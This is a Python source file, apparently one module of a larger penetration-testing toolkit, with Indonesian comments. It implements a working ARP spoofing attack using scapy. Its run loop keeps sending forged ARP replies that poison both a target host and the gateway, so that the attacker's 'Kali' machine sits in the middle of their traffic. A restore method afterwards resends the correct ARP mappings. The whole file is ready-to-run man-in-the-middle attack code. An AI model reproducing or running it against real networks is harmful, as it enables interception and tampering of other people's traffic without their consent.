import scapy.all as scapy
import time
from utils.logger import logger
from utils.network_ops import get_mac

class ARPSpoofer:
    def __init__(self, target_ip, gateway_ip):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.target_mac = get_mac(target_ip)
        self.gateway_mac = get_mac(gateway_ip)
        self.is_running = False

    def spoof(self, target_ip, spoof_ip, target_mac):
        # op=2 adalah ARP Reply
        # hwdst ditambahkan agar tidak memicu warning Scapy (Unicast send)
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

    def restore(self):
        logger.info(f"Memulihkan tabel ARP: {self.target_ip} & {self.gateway_ip}")
        # Mengirim paket ARP yang benar (hwsrc asli dipasangkan dengan psrc asli)
        packet1 = scapy.ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, 
                          psrc=self.gateway_ip, hwsrc=self.gateway_mac)
        packet2 = scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, 
                          psrc=self.target_ip, hwsrc=self.target_mac)
        
        # Kirim beberapa kali untuk memastikan target menerimanya
        scapy.send(packet1, count=5, verbose=False)
        scapy.send(packet2, count=5, verbose=False)
        logger.info("Tabel ARP berhasil dipulihkan dengan aman.")

    def run(self):
        if not self.target_mac or not self.gateway_mac:
            logger.error("Gagal mendapatkan MAC Address. Pastikan IP valid dan host hidup.")
            return

        self.is_running = True
        logger.info(f"Memulai ARP Spoofing -> Target: {self.target_ip} | Gateway: {self.gateway_ip}")
        
        try:
            while self.is_running:
                # Tipu Target: Katakan bahwa Gateway adalah SAYA (Kali)
                self.spoof(self.target_ip, self.gateway_ip, self.target_mac)
                # Tipu Gateway: Katakan bahwa Target adalah SAYA (Kali)
                self.spoof(self.gateway_ip, self.target_ip, self.gateway_mac)
                time.sleep(2)
        except Exception as e:
            logger.error(f"Error pada modul ARP: {e}")
            self.is_running = False